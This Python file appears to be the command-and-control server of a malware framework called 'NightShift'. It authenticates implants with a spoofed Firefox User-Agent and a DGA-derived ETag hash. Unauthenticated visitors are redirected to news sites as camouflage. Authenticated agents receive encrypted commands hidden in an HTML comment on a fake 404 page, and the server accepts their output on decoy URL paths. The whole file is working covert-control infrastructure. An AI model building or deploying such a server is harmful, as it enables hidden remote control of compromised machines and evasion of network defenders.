#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import hashlib

from aiohttp import web
from nightshift_dga import NightShift_DGA
from nightshift_cipher import NightShift_Cipher

async def hello(request):
    ns_get_key = NightShift_DGA()
    ns_get_cipher = NightShift_Cipher()
    ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
    ns_hsh_key = ns_get_cipher.hash_keys_hosts(ns_hdr_key)
    ns_hdr = request.headers
    ns_rmt_ip = request.remote
    #print(ns_hdr_key)
    #print(ns_hsh_key)
    #print(ns_rmt_ip)
    ns_ua_chk = ns_hdr.get('User-Agent')
    ns_et_chk = ns_hdr.get('ETag')
    ns_custom_fof_path = 'ns_custom_fof.txt'
    if (ns_ua_chk == 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/84.0' and ns_et_chk == ns_hsh_key):
        print('New agent coming online. Remote IP: {0:s} UserAgent: {1:s}'.format(ns_rmt_ip,ns_ua_chk))
        return web.Response(text='Test Sucessful')
    else:
        print('Someone knocking but does not have the goods. Remote IP: {0:s} UserAgent: {1:s}'.format(ns_rmt_ip,ns_ua_chk))
        return web.HTTPFound('https://www.nytimes.com/')


async def InitCall(request):
    ns_get_key = NightShift_DGA()
    ns_get_cipher = NightShift_Cipher()
    ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
    ns_hsh_key = ns_get_cipher.hash_keys_hosts(ns_hdr_key)
    ns_hdr = request.headers
    ns_rmt_ip = request.remote
    #print(ns_hdr_key)
    #print(ns_hsh_key)
    #print(ns_rmt_ip)
    ns_ua_chk = ns_hdr.get('User-Agent')
    ns_et_chk = ns_hdr.get('ETag')
    ns_custom_fof_path = 'ns_custom_fof.txt'
    if (ns_ua_chk == 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/84.0' and ns_et_chk == ns_hsh_key):
        print('New agent initialized. Remote IP: {0:s} UserAgent: {1:s}'.format(ns_rmt_ip,ns_ua_chk))
        return web.Response(text='Initialization Complete, welcome to the nightshift.')
    else:
        print('Someone knocking but does not have the goods. Remote IP: {0:s} UserAgent: {1:s}'.format(ns_rmt_ip,ns_ua_chk))
        return web.HTTPFound('https://www.vulture.com/')

async def FourOFour(request):
    ns_get_key = NightShift_DGA()
    ns_get_cipher = NightShift_Cipher()
    ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
    ns_hsh_key = ns_get_cipher.hash_keys_hosts(ns_hdr_key)
    ns_hdr = request.headers
    ns_rmt_ip = request.remote
    #print(ns_hdr_key)
    #print(ns_hsh_key)
    #print(ns_rmt_ip)
    ns_ua_chk = ns_hdr.get('User-Agent')
    ns_et_chk = ns_hdr.get('ETag')
    if (ns_ua_chk == 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/84.0' and ns_et_chk == ns_hsh_key):
    # if ns_ua_chk == 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0':
        print('Nightshift Agent has requested payload. Remote IP: {0:s} UserAgent: {1:s}'.format(ns_rmt_ip,ns_ua_chk))
        ns_cmd_path = "ns_fof_cmd.json"
        ns_custom_fof_path = 'ns_custom_fof.txt'
        with open(ns_cmd_path, 'r') as ns_cmd_f:
            ns_cmd_f = ns_cmd_f.read()
            ns_cipher_cmd = ns_get_cipher.encrypt(ns_cmd_f)
            # print(ns_cipher_cmd)
        with open(ns_custom_fof_path, 'r') as ns_custom_fof_f:
            ns_custom_fof_f = ns_custom_fof_f.read()
            ns_custom_fof_f += '<!--HTMLDOC:'+ns_cipher_cmd+'HTMLDOC>'
            # print(ns_custom_fof_f)
        return web.HTTPNotFound(
                    text= ns_custom_fof_f,
                    content_type="text/html"
                    )
    else:
        print('Someone knocking but does not have the goods. Remote IP: {0:s} UserAgent: {1:s}'.format(ns_rmt_ip,ns_ua_chk))
        return web.HTTPFound('https://www.theverge.com')

async def Post_Output(request):
    ns_get_key = NightShift_DGA()
    ns_get_cipher = NightShift_Cipher()
    ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
    ns_hsh_key = ns_get_cipher.hash_keys_hosts(ns_hdr_key)
    ns_hdr = request.headers
    ns_rmt_ip = request.remote
    #print(ns_hdr_key)
    #print(ns_hsh_key)
    #print(ns_rmt_ip)
    ns_ua_chk = ns_hdr.get('User-Agent')
    ns_et_chk = ns_hdr.get('ETag')
    if (ns_ua_chk == 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/84.0' and ns_et_chk == ns_hsh_key):
        return web.Response(text='OK')
    else:
        print('Someone knocking but does not have the goods. Remote IP: {0:s} UserAgent: {1:s}'.format(ns_rmt_ip,ns_ua_chk))
        return web.Response(text='Well OK but what?')

app = web.Application()
app.add_routes([web.get('/', hello),
                web.get('/celeberities/fail/pix', InitCall),
                web.get('/latestgadgets/top/picks', FourOFour),
                web.get('/political/gossip/new', Post_Output)])

if __name__ == '__main__':
    web.run_app(app)
